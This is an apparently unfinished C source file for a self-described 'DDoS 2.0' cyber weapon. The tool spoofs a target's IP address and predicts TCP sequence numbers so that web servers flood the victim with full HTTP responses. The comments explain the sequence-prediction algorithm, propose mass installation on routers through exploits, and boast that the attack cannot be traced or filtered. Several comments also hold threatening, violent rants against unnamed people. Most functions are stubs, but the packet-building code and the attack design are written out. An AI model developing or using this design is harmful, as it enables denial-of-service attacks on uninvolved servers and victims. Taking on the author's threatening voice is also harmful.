/*
DDoS 2.0 - Merry X-Mas
This will be ready to go cyber warfare weapon which is fully untracable, and impossible to filter.

The point of this is to go from 30,000 connections a minute to as many as possible.  I will attempt to make this as small and concise as possible... I'd like it to be
modular enough to work diretly in routers.  It can have the option branching off the packet sending to other boxes keeping things minimum on routers, and it should
work fine.

A lot of the packets can be automatically determined thus only one single SEQ from remote webserver is really required.  One connection to the webserver along with that
seq will give us a roadmap for every following connection of the same request, and if the web server is using PSH which most are... itll send back the entire response.
example:
Seq (or ACK if remote side) increases by the size, and on some TCP/IP flags by one.. the same request will affect the SEQ by the same amount if done equally...
the remote side will send back a full response, and even further packets  regardless of receiving anymore proper SEQs so if the remote side has somme dynamic scrits
such as PHP, etc.. and its SEQ cannot be foreseen.. its already too late and the damage is done.  This is why only a SINGLE SEQ (initial) is required.  The burden
is decreased greatly because of this.  Quantum inserts entire framework could be weaponized worldwide immediately today due to their infrastructure already beign in
place, etc.

Do not fear.  A lot of other companies, ISPs, etc all have networks with passive monitoring that you can hack so you can be a world class cyber warrior as well.

The games are no longer just for the NSA.  I bring you fun.  DDoS 2.0.

Impossible to firewall, impossible to trace... just pure cyber warfare.


1 simulated connection using the same data will give us a list of how we expect the packets to these servers to respond (just in case their tcp/ip protocol varies
a tiny bit)...
what we need?
every packets SEQ/ACK fromm both sides, and the sizes
since HTTP doesnt require the remote side to give ANy data abefore we send our request, and itll respond immediately... 
unless our request is bigger than 1 window (1500)  then itll prob be 100% no issues

oh wow.. ipv6 is another thing entirely.. it takes a simplle attack, and allows destroying networks with smalller networks.. insane.
the more IPs is better for connectivity but extremely tough for firewalling, etc



very expensive rape huh?  the damages will not  be known for a long time.. like i mentioned  in my fax to congress... still think these rapists will walk away?
im far fromm done.. no more demonstration just straight damage. alrighty.. i was drugged 4 days ago.. dont blame anyone but all of yourselves.
I bet in the future you don't take me as doing nothing as the end of things.  Its called strategy. I just wanted to ensure nobody would be left.
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <stdint.h>
#include <netinet/ip6.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <netinet/icmp6.h>  
#include <arpa/inet.h>
#include <stddef.h> /* For offsetof */
#include "network.h"
#include "antisurveillance.h"
#include "packetbuilding.h"
#include "research.h"
#include "utils.h"
#include "identities.h"
#include "scripting.h"
#include "network_api.h"
#include "instructions.h"
#include <math.h>
#include "cyberwarfare.h"




// correleation between incomming packets source ports, and the probable attacks
typedef struct _cw_source_port_info {
    int attack_id;
} CW_SourcePortOracles;

typedef struct _cw_seq_info {
    int attack_id;
} CW_SeqOracles;

// current attacks must be listed somewhere.. lets  have a small list so that we can just initialize connections to the router
// and itll find the proper data when that moment arrives and generate the bytes required to get the full HTTP response back to the client
typedef struct _cw_attack_queue {
    int id;

    uint32_t webserver_ip;
    uint32_t target_ip;

    // this needsd to change by time slices
    uint32_t source_port;
    uint32_t destination_port;

    uint32_t seq;
    uint32_t remote_seq;

    uint32_t client_identifier;

    char data[1500];
    int data_size;
} CW_AttackQueue;

// lets keep it down to array instead of linked lists... id like it to work 100% quick in routers
struct _cyberwarfare_context {
    CW_AttackQueue queue[1024];

    OutgoingPacketQueue *outgoing_packets;
} CW_Context;


/*
first we will use my network API ... and then modify it to make it standalone for routers
ill try to implement fully on Bro IDS just to show exampes of using..... with a single router exploit
this could be automatically installed on mass routers worldwide preparing for use...
remember.. if on passive taps, or major ISPs... its 100% untracable depending on your TTL
*/
PacketBuildInstructions *CW_BasePacket(CW_AttackQueue *qptr, int client, int flags) {
    PacketBuildInstructions *bptr = NULL;

    // generate ACK packet to finalize TCP/IP connection opening
    if ((bptr = (PacketBuildInstructions *)calloc(1, sizeof(PacketBuildInstructions))) == NULL)
        return NULL;

    bptr->type = PACKET_TYPE_TCP;
    bptr->flags = flags;

    bptr->tcp_window_size = 1500 - (20*2+12);
    bptr->ttl = 64;

    // ipv4..
    bptr->type |= PACKET_TYPE_TCP_4 | PACKET_TYPE_IPV4;
    bptr->source_ip = client ? qptr->target_ip : qptr->webserver_ip;
    bptr->destination_ip = client ? qptr->webserver_ip : qptr->target_ip;
    //!!! ipv6

    //bptr->source_port = sptr->port;
    bptr->destination_port = client ? qptr->destination_port : qptr->source_port;
    bptr->source_port = client ? qptr->source_port : qptr->destination_port;

    bptr->header_identifier = qptr->client_identifier++;

    bptr->seq = client ? qptr->seq : qptr->remote_seq;
    bptr->ack = client ? qptr->remote_seq : qptr->seq;

    return bptr;
}




// generate all packets required for a http request to some web server spoofing the target
int CW_GenerateRequest(CW_Context *cw_ctx) {
    int ret = 0;
    PacketBuildInstructions *bptr = NULL;
    CW_AttackQueue *qptr = NULL;

    // pick the first queue for testing
    qptr = &cw_ctx->queue[0];

    // generate the 3rd packet of the tcp/ip handshake.. ack of SYN/ACK
    if ((bptr = CW_BasePacket(qptr, 1, TCP_FLAG_ACK)) == NULL) return -1;
    L_link_ordered((LINK **)&cw_ctx->outgoing_packets, (LINK *)bptr);

    // generate the GET request for the HTTP server
    // pick them by their sizes of course
    if ((bptr = CW_BasePacket(qptr, 1, TCP_FLAG_ACK)) == NULL) return -1;
    bptr->data = &qptr->data;
    bptr->data_size = qptr->data_size;
    L_link_ordered((LINK **)&cw_ctx->outgoing_packets, (LINK *)bptr);

    ret = 1;
    // we just generated the 3rd, and 4th packets.. the attack will proceed

    return ret;
}



/*
1: SYN seq:0 ack:0

This is the ONLY packet we care about... the rest is calculated.  
2: SYN,ACK seq:0 ack:1

3: ACK seq:1 ack:1
4: Request (GET / fjdofjofjd)  ack:1 seq:1

3 & 4 are both ours, and possibly can be turned into one.. ill check into it
maybe  not if the tcp/ip protocols dont process it the same until its literallly activated
--- everything below is irrelevant --
5: ACK
6: DATA 200 OK...
7: DATA1 <HTML>
8: DATA2 .... 
etc..etc... 
.....
15:PSH,FIN,ACK </HTML>
16:FIN,ACK
17:ACK
--- end of connection

As you can see.. the first four packets are the only which matter.  The rest are irrelevant, and actually... The 3rd, and 4th can be sent practically
together.  The good thing about this is... we only have to process a single source port one time per connection.  The limitation of not closing connections
properly is that if we are attacking using some service such as google then there is a 5 minute timeout for all 65535 ports.. not a huge limitation. I doubt
it'l eever matter since this is just a SINGLE web server when we can target many many more.  If done properly, and timed correctly
we can pick and choose our source ports, and sequence numbers for our side by timing (literally time(0)) because this means we will completely ignore
all future packets fromm connections we are establishing without ever processing it purely by a simple checksum, and the timing.. in reality
if we only allow things that match the current time (if we limit it to 1.5-2 seconds) then nothing beyond that window will even reach our code.

This is a substantial speed increase from my virtual tcp/ip stack which required verifying everything.  I hope I can test it on a local vmware tomorrow...

epoch  can be virtualized and  modulated by years, then months/weeks, days, and then hours, minutes and into seconds.. then we can create tcp/ip slices (windows)
and generate our SEQs using this so that whenever the target web servers respond we then generate immediately the 2 packets  its expecting... the remote side should
process them in order and worse case we put a small delay on the outgoing queue but we never allow those same SEQ, or source port for the next slice..
therefore the  algorothm is constantly choosing/changing

this is the fastest i ve comme up with somme far to handle this situation

4 bits = var 1 (secs/2)
4 bits = secs 5 2 (time slice in minute)
8 bits = ip modular (% 65535)
16 bits = source port+checksum

souurce port > 32000 (to cut 16 bits into 8)  (can swap between high/low every few minutes).. or can use % 2 (to mix up high/low in between)
src port > 0x0000ffff

checksum = a+b * src

// algorithm for seq (ver 1)
seq = [4 bits:var_1][4 bits:var_2][8 bits: ip % 0xffff][4:src - 0xffff0000][4: (var_1+var_2*(src&0x0000ffff))]

thats the whole application right here..
time to finish code, clean it up.. and also attempt to find main routers onlines code so i can integrate it or at least have a practically ready to go system
for anyone to begin testing...

trust me.. it works.


*/

// for now we will use my network.c but it should be easy to modify incoming to receive all packets which match a criteria later...
int Cyberwarefare_DDoS_Init() {
    int ret = -1;
    NetworkAnalysisFunctions *nptr = NULL;
    FilterInformation *flt = NULL;

    memset(&CW_Context, 0, sizeof(struct _cyberwarfare_context));

    // global pointer required since all network functions API are set is stone..
    // another option is to have the thread itself hold it in TLS
    NetworkAPI_CTX = ctx;

    // lets prepare incoming ICMP processing for our traceroutes
    if ((flt = (FilterInformation *)calloc(1, sizeof(FilterInformation))) == NULL) goto end;

    // empty filter.. we want everything.
    FilterPrepare(flt, 0, 0);

    // add into network subsystem so we receive all packets
    if (Network_AddHook(ctx, flt, &NetworkAPI_Incoming) != 1) goto end;

    ret =  1;

    end:;
    return ret;
}


// all packets reacch this function so that we can determine if any are for our network stack
int Cyberwarefare_Incoming(AS_context *ctx, PacketBuildInstructions *iptr) {
    int ret = 0;
    SocketContext *sptr = NULL, *connptr = NULL;
    IOBuf *bptr = NULL;
    int j = 0;

    // we need to analyze the current time, source ports, and then determine if its for an attacak
    // the timme slice should invalidate.. and this should get moved directly after reading fromm network kdevice

end:;
    return ret;
}


// initiate a ddos 2.0 attack using a web server spoofing the target.. returning the ID
int Cyberwarefare_Initiate_Attack(char *host, char *buf, int size) {
    int ret = 0;


    return ret;
}

int Cyberwarefare_Complete_Attack(int id) {
    int ret = 0;


    return ret;
}


int Cyberwarefare_Perform(AS_context *ctx) {
    int ret = 0;

    return ret;
}